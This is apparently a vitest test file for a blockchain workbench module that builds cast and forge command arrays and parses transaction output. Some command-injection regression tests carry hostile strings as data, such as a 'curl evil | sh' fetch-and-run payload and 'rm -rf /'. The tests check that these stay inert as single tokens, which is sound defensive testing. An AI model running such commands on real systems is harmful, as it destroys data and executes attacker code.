import type { WorkbenchOperation } from "@chainviz/shared";
import { describe, expect, it } from "vitest";
import {
  buildOperationCommand,
  CONTRACTS_MOUNT_PATH,
  describeOperation,
  parseCastTxHash,
  parseForgeDeployedAddress,
  parseForgeTxHash,
  parseOperationOutcome,
} from "./workbench-operations.js";

const ctx = {
  mnemonic: "sleep moment list remain",
  walletIndex: 2,
  ethRpcUrl: "http://host.docker.internal:4001",
};

describe("buildOperationCommand", () => {
  it("builds a cast send command for transfer", () => {
    const operation: WorkbenchOperation = {
      type: "transfer",
      to: "0x8943545177806ED17B9F23F0a21ee5948eCaa776",
      amount: "1000000000000000000",
    };
    expect(buildOperationCommand(operation, ctx)).toEqual([
      "cast",
      "send",
      "--rpc-url",
      ctx.ethRpcUrl,
      "--mnemonic",
      ctx.mnemonic,
      "--mnemonic-index",
      "2",
      "--value",
      "1000000000000000000",
      "0x8943545177806ED17B9F23F0a21ee5948eCaa776",
    ]);
  });

  it("builds a forge create command for deployContract, rooted at the contracts mount", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).toEqual([
      "forge",
      "create",
      "src/Counter.sol:Counter",
      "--root",
      CONTRACTS_MOUNT_PATH,
      "--rpc-url",
      ctx.ethRpcUrl,
      "--mnemonic",
      ctx.mnemonic,
      "--mnemonic-index",
      "2",
      "--broadcast",
    ]);
    expect(cmd).not.toContain("--constructor-args");
  });

  it("does not add --constructor-args when constructorArgs is undefined", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).not.toContain("--constructor-args");
  });

  it("does not add --constructor-args when constructorArgs is an empty array (Issue #201)", () => {
    // DeployForm.tsx はコンストラクタ引数を持たないコントラクトでも
    // `constructorArgs: []`(省略ではなく空配列)を送る。フラグだけ付けて
    // 値を1つも渡さないと forge create が失敗するため、undefined と同様に
    // フラグ自体を付けないことを確認する。
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
      constructorArgs: [],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).not.toContain("--constructor-args");
  });

  it("appends --constructor-args with each value as a distinct token when constructorArgs is given", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/ChainvizToken.sol:ChainvizToken",
      constructorArgs: ["1000000000000000000000000"],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).toEqual([
      "forge",
      "create",
      "src/ChainvizToken.sol:ChainvizToken",
      "--root",
      CONTRACTS_MOUNT_PATH,
      "--rpc-url",
      ctx.ethRpcUrl,
      "--mnemonic",
      ctx.mnemonic,
      "--mnemonic-index",
      "2",
      "--broadcast",
      "--constructor-args",
      "1000000000000000000000000",
    ]);
  });

  it("passes multiple constructorArgs through unchanged and in order, placed last", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/ChainvizToken.sol:ChainvizToken",
      constructorArgs: ["My Token", "MTK", "18"],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd.slice(-4)).toEqual([
      "--constructor-args",
      "My Token",
      "MTK",
      "18",
    ]);
  });

  it("keeps constructorArgs values containing shell metacharacters as single tokens", () => {
    // コマンドインジェクション防止の回帰: constructorArgs にもシェル特殊文字
    // （; | & ` $() 等）を含む値を渡した場合でも、1 つのトークンとして残り、
    // シェル文字列に連結されないこと（他の既存引数と同じ流儀）。
    const danger = "0xdead; curl evil | sh `whoami` $(id)";
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/ChainvizToken.sol:ChainvizToken",
      constructorArgs: [danger, "18"],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd.filter((t) => t === danger)).toHaveLength(1);
    expect(cmd[cmd.length - 2]).toBe(danger);
    expect(cmd[cmd.length - 1]).toBe("18");
    // danger 以外のトークンにシェル特殊文字が漏れ出していないこと。
    expect(cmd.every((t) => t === danger || !/[;|&`$]/.test(t))).toBe(true);
  });

  it("builds a cast send command for callContract without amount (no --value)", () => {
    const operation: WorkbenchOperation = {
      type: "callContract",
      contractAddress: "0x0c0de",
      functionName: "increment()",
      args: [],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).toEqual([
      "cast",
      "send",
      "--rpc-url",
      ctx.ethRpcUrl,
      "--mnemonic",
      ctx.mnemonic,
      "--mnemonic-index",
      "2",
      "0x0c0de",
      "increment()",
    ]);
    expect(cmd).not.toContain("--value");
  });

  it("builds a cast send command for callContract with amount", () => {
    const operation: WorkbenchOperation = {
      type: "callContract",
      contractAddress: "0x0c0de",
      functionName: "transfer(address,uint256)",
      args: ["0x0b0b", "500"],
      amount: "0",
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd).toEqual([
      "cast",
      "send",
      "--rpc-url",
      ctx.ethRpcUrl,
      "--mnemonic",
      ctx.mnemonic,
      "--mnemonic-index",
      "2",
      "--value",
      "0",
      "0x0c0de",
      "transfer(address,uint256)",
      "0x0b0b",
      "500",
    ]);
  });

  it("keeps each argument as a distinct array element even if it contains shell metacharacters", () => {
    // コマンドインジェクション防止の回帰: シェルに解釈させる文字（; | & 等）を
    // 含む値でも、1 つのトークンとして残ること（シェル文字列に連結して
    // いないこと）を確認する。
    const dangerous = "0xabc; rm -rf / #";
    const operation: WorkbenchOperation = {
      type: "transfer",
      to: dangerous,
      amount: "1",
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd[cmd.length - 1]).toBe(dangerous);
    expect(cmd.some((token) => token.includes(";") && token !== dangerous)).toBe(
      false,
    );
  });

  it("passes callContract args through unchanged and in order", () => {
    const operation: WorkbenchOperation = {
      type: "callContract",
      contractAddress: "0x0c0de",
      functionName: "approve(address,uint256)",
      args: ["0x0b0b", "1", "extra-arg"],
    };
    const cmd = buildOperationCommand(operation, ctx);
    expect(cmd.slice(-3)).toEqual(["0x0b0b", "1", "extra-arg"]);
  });

  it("keeps shell metacharacters as single tokens for deployContract and callContract too", () => {
    // コマンドインジェクション防止の回帰を transfer 以外の操作にも広げる。
    // ; | & ` $() などシェルに解釈させうる文字を含む値でも、対応する引数が
    // 1 トークンのまま残り、他のトークンへ混入しないこと。
    const danger = "0xdead; curl evil | sh `whoami` $(id)";

    const deploy = buildOperationCommand(
      { type: "deployContract", contractKey: danger },
      ctx,
    );
    expect(deploy[2]).toBe(danger);
    expect(deploy.filter((t) => t === danger)).toHaveLength(1);

    const call = buildOperationCommand(
      {
        type: "callContract",
        contractAddress: danger,
        functionName: "transfer(address,uint256)",
        args: [danger, "1"],
      },
      ctx,
    );
    // contractAddress と args[0] の 2 か所に、それぞれ単一トークンとして現れる。
    expect(call.filter((t) => t === danger)).toHaveLength(2);
    // danger 以外のトークンにシェル特殊文字が漏れ出していないこと
    // （どのトークンも「危険値そのもの」か「特殊文字を含まない」のどちらか）。
    expect(
      call.every(
        (t) => t === danger || !/[;|&`$]/.test(t),
      ),
    ).toBe(true);
  });
});

describe("parseCastTxHash", () => {
  it("extracts the transactionHash from cast send's tabular output", () => {
    const stdout = [
      "blockHash               0xdeadbeef",
      "blockNumber             12",
      "transactionHash         0xabc123def456",
      "transactionIndex        0",
    ].join("\n");
    expect(parseCastTxHash(stdout)).toBe("0xabc123def456");
  });

  it("returns undefined when there is no transactionHash line", () => {
    expect(parseCastTxHash("some unrelated output")).toBeUndefined();
  });

  it("returns undefined for an empty string", () => {
    expect(parseCastTxHash("")).toBeUndefined();
  });

  it("does not match a differently-prefixed key (anchored at line start)", () => {
    // 行頭アンカー（^ ... /m）なので、"...transactionHash" のように前置きの
    // ある行や、インデントされた行では一致しない。cast の実出力は行頭に
    // キーを置くため、この厳格さで誤検出を避けられる。
    expect(parseCastTxHash("myTransactionHash 0xabc")).toBeUndefined();
    expect(parseCastTxHash("   transactionHash 0xabc")).toBeUndefined();
  });

  it("extracts an uppercase-hex transactionHash", () => {
    expect(parseCastTxHash("transactionHash   0xABCdef123")).toBe("0xABCdef123");
  });

  it("returns the first transactionHash when several lines are present", () => {
    // 非グローバル match のため、最初の一致を返す（想定外に複数行あっても
    // 破綻せず先頭を採る）。
    const stdout = ["transactionHash 0xaaa", "transactionHash 0xbbb"].join("\n");
    expect(parseCastTxHash(stdout)).toBe("0xaaa");
  });

  it("tolerates surrounding lines and CRLF-style breaks", () => {
    const stdout = "status 1 (success)\r\ntransactionHash 0xfeed\r\ngasUsed 21000";
    expect(parseCastTxHash(stdout)).toBe("0xfeed");
  });
});

describe("parseForgeTxHash / parseForgeDeployedAddress", () => {
  it("extracts both from forge create's output", () => {
    const stdout = [
      "Deployer: 0x1111111111111111111111111111111111111111",
      "Deployed to: 0x2222222222222222222222222222222222222222",
      "Transaction hash: 0x3333333333333333333333333333333333333333333333333333333333333333",
    ].join("\n");
    expect(parseForgeDeployedAddress(stdout)).toBe(
      "0x2222222222222222222222222222222222222222",
    );
    expect(parseForgeTxHash(stdout)).toBe(
      "0x3333333333333333333333333333333333333333333333333333333333333333",
    );
  });

  it("returns undefined for both when the output doesn't match (e.g. a failure message)", () => {
    const stdout = "Error: insufficient funds for gas * price + value";
    expect(parseForgeDeployedAddress(stdout)).toBeUndefined();
    expect(parseForgeTxHash(stdout)).toBeUndefined();
  });

  it("returns undefined for both on an empty string", () => {
    expect(parseForgeDeployedAddress("")).toBeUndefined();
    expect(parseForgeTxHash("")).toBeUndefined();
  });

  it("matches case-insensitively and tolerates tabs / zero spacing", () => {
    // 出力ラベルの大小や区切りの揺れ（タブ・スペース無し）でも取り出せること。
    expect(parseForgeTxHash("transaction hash:\t0xFEED")).toBe("0xFEED");
    expect(parseForgeDeployedAddress("DEPLOYED TO:0x1234")).toBe("0x1234");
  });

  it("extracts the address even when the label is indented or has trailing text", () => {
    const stdout = "  Deployed to: 0xabc (contract Counter)";
    expect(parseForgeDeployedAddress(stdout)).toBe("0xabc");
  });

  it("returns the first match when the label appears more than once", () => {
    const stdout = ["Deployed to: 0xaaa", "Deployed to: 0xbbb"].join("\n");
    expect(parseForgeDeployedAddress(stdout)).toBe("0xaaa");
  });
});

describe("parseOperationOutcome", () => {
  it("extracts only txHash for transfer", () => {
    const operation: WorkbenchOperation = {
      type: "transfer",
      to: "0x0b0b",
      amount: "1",
    };
    const stdout = "transactionHash         0xabc\n";
    expect(parseOperationOutcome(operation, stdout)).toEqual({
      txHash: "0xabc",
    });
  });

  it("extracts only txHash for callContract", () => {
    const operation: WorkbenchOperation = {
      type: "callContract",
      contractAddress: "0x0c0de",
      functionName: "increment()",
      args: [],
    };
    const stdout = "transactionHash         0xdef\n";
    expect(parseOperationOutcome(operation, stdout)).toEqual({
      txHash: "0xdef",
    });
  });

  it("extracts both txHash and deployedAddress for deployContract", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    const stdout = [
      "Deployed to: 0x2222222222222222222222222222222222222222",
      "Transaction hash: 0x3333333333333333333333333333333333333333333333333333333333333333",
    ].join("\n");
    expect(parseOperationOutcome(operation, stdout)).toEqual({
      txHash:
        "0x3333333333333333333333333333333333333333333333333333333333333333",
      deployedAddress: "0x2222222222222222222222222222222222222222",
    });
  });

  it("returns an empty object (no fields) when nothing could be parsed", () => {
    const operation: WorkbenchOperation = {
      type: "transfer",
      to: "0x0b0b",
      amount: "1",
    };
    expect(parseOperationOutcome(operation, "unrelated output")).toEqual({
      txHash: undefined,
    });
  });

  it("returns txHash but undefined deployedAddress when forge output lacks a 'Deployed to' line", () => {
    // デプロイ tx は送れたが（Transaction hash はある）、"Deployed to" 行が
    // 出力に無い/取れなかった部分成功。付随情報の欠落を例外にせず、取れた
    // フィールドだけを返す（parseOperationOutcome の握り込み方針の回帰）。
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    expect(
      parseOperationOutcome(operation, "Transaction hash: 0xabc"),
    ).toEqual({ txHash: "0xabc", deployedAddress: undefined });
  });

  it("returns both fields undefined for deployContract when the output is empty", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    expect(parseOperationOutcome(operation, "")).toEqual({
      txHash: undefined,
      deployedAddress: undefined,
    });
  });
});

describe("describeOperation", () => {
  it("describes transfer", () => {
    const operation: WorkbenchOperation = {
      type: "transfer",
      to: "0x0b0b",
      amount: "1000",
    };
    expect(describeOperation(operation)).toBe("transfer 1000 to 0x0b0b");
  });

  it("describes deployContract", () => {
    const operation: WorkbenchOperation = {
      type: "deployContract",
      contractKey: "src/Counter.sol:Counter",
    };
    expect(describeOperation(operation)).toBe(
      "deployContract src/Counter.sol:Counter",
    );
  });

  it("describes callContract", () => {
    const operation: WorkbenchOperation = {
      type: "callContract",
      contractAddress: "0x0c0de",
      functionName: "transfer(address,uint256)",
      args: ["0x0b0b", "1"],
    };
    expect(describeOperation(operation)).toBe(
      "callContract transfer(address,uint256) on 0x0c0de",
    );
  });
});
